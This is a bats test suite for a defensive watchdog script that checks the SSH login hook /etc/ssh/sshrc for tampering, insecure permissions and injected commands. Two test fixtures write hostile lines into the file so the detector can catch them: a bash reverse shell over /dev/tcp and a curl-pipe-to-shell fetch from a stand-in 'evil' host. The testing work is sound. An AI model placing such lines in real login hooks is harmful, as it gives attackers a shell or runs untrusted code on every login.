#!/usr/bin/env bats
# L2 bats functional tests for the sshrc-watchdog scan script.
#
# /etc/ssh/sshrc (and ~/.ssh/rc) is run by sshd for EVERY successful SSH
# login, before the user's shell — a per-login exec surface that fires on a
# legitimate credentialed login (T1546). A file that is world-writable /
# non-root-owned, or contains a command-injection pattern, is alert.
#
# Run with: bats packaging/test/L2-sshrc-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/sshrc-watchdog/systemd/sshrc-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    SSHRC="${TMP}/sshrc"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_SSHRC_PROFILE="${PROFILE:-report}" \
    SELFDEF_SSHRC_BASELINE="${BASELINE}" \
    SELFDEF_SSHRC_FILES="${FILES_V:-$SSHRC}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

seed_benign() {
    printf '# sshrc\nif read proto cookie && [ -n "$DISPLAY" ]; then :; fi\n' > "${SSHRC}"
}

@test "no sshrc → ok / no_sshrc" {
    FILES_V="${TMP}/nonexistent" run_wd
    cap | grep -q '"event":"no_sshrc"'
    cap | grep -q '"severity":"ok"'
}

@test "benign sshrc, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged sshrc on second run → ok / sshrc_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"sshrc_intact"'
    cap | grep -q '"severity":"ok"'
}

@test "an injection pattern in sshrc → alert / sshrc_suspicious" {
    seed_benign
    run_wd
    printf '# sshrc\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "${SSHRC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"sshrc_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable sshrc → alert" {
    seed_benign
    run_wd
    chmod 0666 "${SSHRC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a benign sshrc change → warn / sshrc_changed" {
    seed_benign
    run_wd
    printf '# sshrc\nif read proto cookie; then logger "ssh login"; fi\n' > "${SSHRC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"sshrc_changed"'
    cap | grep -q '"severity":"warn"'
}

@test "a benign root-owned sshrc is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious sshrc" {
    seed_benign
    run_wd
    printf '# sshrc\ncurl http://evil/p|sh\n' > "${SSHRC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}
